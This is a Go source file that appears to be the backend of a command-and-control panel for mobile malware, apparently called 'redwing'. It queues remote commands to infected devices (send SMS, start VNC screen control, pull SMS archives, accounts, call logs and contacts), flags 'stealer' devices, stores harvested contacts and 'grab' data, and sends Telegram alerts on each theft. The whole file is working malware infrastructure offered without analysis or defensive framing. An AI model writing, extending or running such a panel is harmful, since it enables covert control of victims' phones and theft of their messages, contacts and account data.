package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"strings"
	"time"

	"redwing/internal/db"
	"redwing/internal/ws"
)

func HandlePanelCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		handleGetCommands(w, r)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/command/"), "/")
	if len(parts) < 2 {
		writeJSON(w, map[string]any{"error": "invalid path"})
		return
	}
	teamID := SessionTeamID(r)
	deviceID := parts[1]

	var req map[string]any
	if json.NewDecoder(r.Body).Decode(&req) != nil {
		writeJSON(w, map[string]any{"error": "invalid request"})
		return
	}

	command, _ := req["command"].(string)
	params, _ := req["params"]

	cmdID := generateCmdID()
	paramsJSON := "{}"
	if params != nil {
		b, _ := json.Marshal(params)
		paramsJSON = string(b)
	}

	db.DB.Exec(
		`UPDATE commands
		 SET status = 'failed', result = '{"error":"stale_pending"}', executed_at = CURRENT_TIMESTAMP
		 WHERE device_id = ? AND team_id = ?
		   AND status IN ('pending', 'sent')
		   AND created_at < datetime('now', '-5 minutes')`,
		deviceID, teamID,
	)

	db.DB.Exec(
		`INSERT INTO commands (id, device_id, team_id, command, params, status) VALUES (?, ?, ?, ?, ?, 'pending')`,
		cmdID, deviceID, teamID, command, paramsJSON,
	)

	wsMsg := map[string]any{
		"type":       "ws_command",
		"command_id": cmdID,
		"cmd_id":     cmdID,
		"command":    command,
		"params":     params,
		"payload":    paramsJSON,
	}
	sent := ws.H.SendToDevice(deviceID, wsMsg)

	if sent {
		db.DB.Exec("UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?", time.Now().UTC().Format("2006-01-02 15:04:05"), cmdID)
		d := ws.H.GetDevice(deviceID)
		if d != nil && !d.IsStealer {
			ws.H.SendToDevice(deviceID, map[string]any{"type": "check_commands"})
		}
	}

	action := ActionSendCommand
	details := command
	if command == "send_sms" {
		action = ActionSendSMS
		details = "SMS команда"
	} else if command == "start_vnc" || command == "start_stream" {
		action = ActionVNCStart
	} else if command == "stop_vnc" || command == "stop_stream" {
		action = ActionVNCStop
	}
	LogActionFromRequest(r, action, deviceID, details)

	writeJSON(w, map[string]any{"success": true, "command_id": cmdID})
}

func handleGetCommands(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/panel/command/")
	if strings.HasPrefix(path, "result/") {
		parts := strings.Split(strings.TrimPrefix(path, "result/"), "/")
		if len(parts) < 2 {
			writeJSON(w, map[string]any{"error": "invalid path"})
			return
		}
		cmdID := parts[1]

		var status, result, command, sentAt string
		err := db.DB.QueryRow("SELECT status, COALESCE(result, ''), command, COALESCE(sent_at, '') FROM commands WHERE id = ?", cmdID).Scan(&status, &result, &command, &sentAt)
		if err != nil {
			writeJSON(w, map[string]any{"status": "not_found"})
			return
		}

		if (status == "sent" || status == "pending") && sentAt != "" {
			t, e := time.Parse("2006-01-02 15:04:05", sentAt)
			if e != nil {
				t, e = time.Parse(time.RFC3339, sentAt)
			}
			timeout := 60 * time.Second
			if status == "pending" {
				timeout = 45 * time.Second
			}
			if e == nil && time.Since(t) > timeout {
				errMsg := `{"error":"device_timeout"}`
				if status == "pending" {
					errMsg = `{"error":"device_unreachable"}`
				}
				now := time.Now().UTC().Format("2006-01-02 15:04:05")
				db.DB.Exec("UPDATE commands SET status = 'failed', result = ?, executed_at = ? WHERE id = ? AND status IN ('sent','pending')",
					errMsg, now, cmdID)
				status = "failed"
				result = errMsg
			}
		}
		if status == "pending" && sentAt == "" {
			var createdAt string
			db.DB.QueryRow("SELECT COALESCE(created_at, '') FROM commands WHERE id = ?", cmdID).Scan(&createdAt)
			if createdAt != "" {
				t, e := time.Parse("2006-01-02 15:04:05", createdAt)
				if e != nil {
					t, e = time.Parse(time.RFC3339, createdAt)
				}
				if e == nil && time.Since(t) > 45*time.Second {
					result = `{"error":"device_unreachable"}`
					now := time.Now().UTC().Format("2006-01-02 15:04:05")
					db.DB.Exec("UPDATE commands SET status = 'failed', result = ?, executed_at = ? WHERE id = ? AND status = 'pending'",
						result, now, cmdID)
					status = "failed"
				}
			}
		}

		resp := map[string]any{"status": status}
		if result != "" {
			var parsed any
			if json.Unmarshal([]byte(result), &parsed) == nil {
				resp["result"] = parsed
			} else {
				resp["result"] = result
			}
		}
		writeJSON(w, resp)
		return
	}

	parts := strings.Split(path, "/")
	if len(parts) < 2 {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}
	teamID := SessionTeamID(r)
	deviceID := parts[1]

	rows, err := db.DB.Query(
		`SELECT id, command, params, status, COALESCE(result,''), created_at FROM commands 
		 WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 50`,
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}
	defer rows.Close()

	var commands []map[string]any
	for rows.Next() {
		var id, cmd, params, status, result, createdAt string
		rows.Scan(&id, &cmd, &params, &status, &result, &createdAt)
		c := map[string]any{
			"id": id, "command": cmd, "status": status, "created_at": createdAt,
		}
		if result != "" {
			c["result"] = result
		}
		commands = append(commands, c)
	}
	if commands == nil {
		commands = []map[string]any{}
	}
	writeJSON(w, map[string]any{"commands": commands})
}

func HandlePanelCommands(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/panel/commands/")
	parts := strings.Split(path, "/")
	if len(parts) < 2 {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}
	teamID := SessionTeamID(r)
	deviceID := parts[1]
	if idx := strings.Index(deviceID, "?"); idx >= 0 {
		deviceID = deviceID[:idx]
	}

	rows, err := db.DB.Query(
		`SELECT id, command, params, status, COALESCE(result,''), created_at FROM commands 
		 WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 50`,
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"commands": []any{}})
		return
	}
	defer rows.Close()

	var commands []map[string]any
	for rows.Next() {
		var id, cmd, params, status, result, createdAt string
		rows.Scan(&id, &cmd, &params, &status, &result, &createdAt)
		c := map[string]any{
			"id": id, "command": cmd, "status": status, "created_at": createdAt,
		}
		if params != "" && params != "{}" {
			c["params"] = params
		}
		if result != "" {
			c["result"] = result
		}
		commands = append(commands, c)
	}
	if commands == nil {
		commands = []map[string]any{}
	}
	writeJSON(w, map[string]any{"commands": commands})
}

func HandleVNCToken(w http.ResponseWriter, r *http.Request) {
	panelID := generateCmdID()
	token := generateCmdID()

	writeJSON(w, map[string]any{
		"panel_id":  panelID,
		"token":     token,
		"timestamp": time.Now().Unix(),
	})
}

func HandleDataSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	path := r.URL.Path

	if strings.Contains(path, "/contacts/sync") && deviceID != "" {
		contacts, _ := req["contacts"].([]any)
		for _, c := range contacts {
			cm, ok := c.(map[string]any)
			if !ok {
				continue
			}
			name, _ := cm["name"].(string)
			phone, _ := cm["phone"].(string)
			if phone == "" {
				continue
			}
			db.DB.Exec(
				"INSERT OR IGNORE INTO contacts (device_id, team_id, name, phone) VALUES (?, ?, ?, ?)",
				deviceID, teamID, name, phone,
			)
		}
		addEvent(teamID, deviceID, "connect", "Contacts synced")
	}

	if strings.Contains(path, "/data/log") && deviceID != "" {
		logType, _ := req["type"].(string)
		dataJSON, _ := json.Marshal(req)
		db.DB.Exec(
			"INSERT INTO grabs (device_id, team_id, grab_type, data) VALUES (?, ?, ?, ?)",
			deviceID, teamID, logType, string(dataJSON),
		)
		addEvent(teamID, deviceID, "grab", "Grab: "+logType)
		SendTelegramNotification(teamID, "grab", map[string]string{
			"device_id": deviceID, "type": logType,
		})
	}

	writeJSON(w, map[string]any{"success": true})
}

func addEvent(teamID, deviceID, evType, title string) {
	db.DB.Exec("INSERT INTO events (team_id, device_id, type, title) VALUES (?, ?, ?, ?)",
		teamID, deviceID, evType, title)
}

func generateCmdID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func isHTTPOnlyCommand(cmd string) bool {
	switch cmd {
	case "get_apps", "apps_list", "get_sms_archive", "get_sms",
		"get_contacts", "get_accounts", "get_call_log":
		return true
	}
	return false
}

